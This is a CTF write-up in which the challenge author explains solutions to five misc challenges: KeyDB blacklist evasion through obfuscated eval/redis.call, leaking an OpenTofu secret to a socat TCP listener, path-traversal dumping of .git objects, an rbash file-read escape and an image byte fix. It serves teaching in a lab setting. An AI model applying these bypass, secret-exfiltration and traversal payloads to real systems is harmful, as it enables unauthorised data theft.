---
title: "CyberTEK-CTF 2k24"
date: 2024-05-05
draft: false
description: "Writeup for the misc challenges I authored at CyberTEK-CTF 2k24: KeyDB command smuggling, OpenTofu secret exfiltration, a git-object forensics puzzle, an rbash escape, and a corrupted image fix hidden in deleted docker layers."
tags: ["ctf", "misc"]
aliases: ["/writeups/CyberTEK-CTF-2k24/"]
---

### Intro;
Last weekend we ran a local CTF at TEKUP University: 30+ custom-authored challenges, 50+ teams, 140+ players. The feedback afterward was good. People actually enjoyed the challenges, which isn't a given.

### About;
  - Event place: TEKUP University. 
  - Event duration: `14hrs`.
  - Flag format: Securinets{.*}.

### Challenges;
I authored six of the Misc challenges, most of them jail-oriented. Here's the breakdown:

|   Challenge     | Points | Solves |  Author |
|-----------------|--------|--------|---------|
|   [Siclodb]()       |  500   |   1    | chxmxii |
|   [Openheimer]()    |  440   |   6    | chxmxii |
|   [bolbok]()        |  470   |   4    | chxmxii |
|   [ekko]()          |  494   |   7    | chxmxii |
|   [heimerdigger]()  |  146   |   18   | xhlayel, chxmxii |

#### Siclodb;
This one was tricky by design. I blacklisted several KeyDB functions so players couldn't pull the flag key directly. The twist: most people didn't realize you could still run `eval()` in the KeyDB console, or fall back to `redis.call()` instead of `KeyDB.call()`. KeyDB is a Redis fork, so the old Redis commands still work under the hood. The winning payload looked like this:
```shell
$ eval "local a='du'; a=a..'mp';local b='fl';b=b..'ag'; local k=redis.call(a, b); return k;" 0
$ eval "local a='ge'; a=a..'t';local b='fl';b=b..'ag'; return cjson.encode(redis.call(a, b))" 0
```
---
#### Openheimer;
Quick context if you haven't run into it: OpenTofu is a community fork of Terraform, born out of a licensing dispute that split the IaC world in two. I built this challenge to put it in front of people. Players connect to a live OpenTofu console and have to figure out how to leak the secrets.

One way in:
```shell
nonsensitive(urlencode(var.SECRET)) | socat - TCP:localhost:13337
```
For more; 
{{< alert "link" >}}
https://opentofu.org/docs/language/functions/nonsensitive/
{{< /alert >}}

---
#### Ekko;
Two API endpoints: one lists directories, one reads files. Hence the description: "ls && cat made easy." Here's the solve:
```python
from os import listdir, path
import requests, re, zlib\

url = "https://ekko.securinets-tekup.tech/"
commit_list = []
request = requests.get(url + "ls?q=...git/objects")
objects = re.findall("\w+", request.text)

if request.status_code == 200:
    for obj in objects:
        get_commit = requests.get(url + "ls?q=...git/objects/" + obj + "/")
        commits = re.findall("\w+", get_commit.text)
        for commit in commits:
            get_blob = requests.get(url + "cat?q=...git/objects/" + obj + "/" + commit)
            with open(commit + ".zlib", "wb") as f:
                f.write(get_blob.content)

for blob in listdir("."):
    with open(blob, "rb") as f:
        blob_content = f.read()
    f.close()
    try:
        decompressed_blob = zlib.decompress(blob_content)
    except zlib.error as e:
        print(f"Zlib error: {e}")
    flag = re.search("Securinets.*", str(decompressed_blob))
    if flag:
        print(flag.group())
```

---
#### Bolbok
Players landed in a restricted `rbash` shell with a short list of allowed commands, and the flag sat in a directory with a name designed to blend in. Anyone comfortable with `ls` and `grep` could still find it fast:
```shell
ls -Ra / | grep flag -B3
<path>:
.
..
.flag
```
Reading it inside a restricted shell was the actual puzzle:
```shell
echo $(< <path>/.flag)
Securinets{FLAG}
OR
while read line; do echo $line; done < <path>/.flag
Securinets{FLAG}
``` 

---
#### Heimerdigger;
The task: dig through Docker layers and recover the deleted files. One of them hinted at how to fix a corrupted JPG: `f(byte) = (15 - byte) modulos 256`.

```python
def transform_file(input_image_path, output_image_path):
    with open(input_image_path, 'rb') as input_file:
        data = input_file.read()
    modified_data = bytearray((15 - byte) % 256 for byte in data)
    with open(output_image_path, 'wb') as output_file:
        output_file.write(modified_data)
        print("Modified image saved to:", output_image_path)

# Usage
input_image_path = "./01946.jpg"
output_image_path = "./heimer.jpg"
transform_file(input_image_path, output_image_path)
``` 
---
### Das Ende;

Thanks to everyone who made the event happen: Securinets TEKUP, the participants, and TEKUP University for hosting. Challenge files and more writeups live in my GitHub repo:

{{< github repo="chxmxii/CTF" >}}
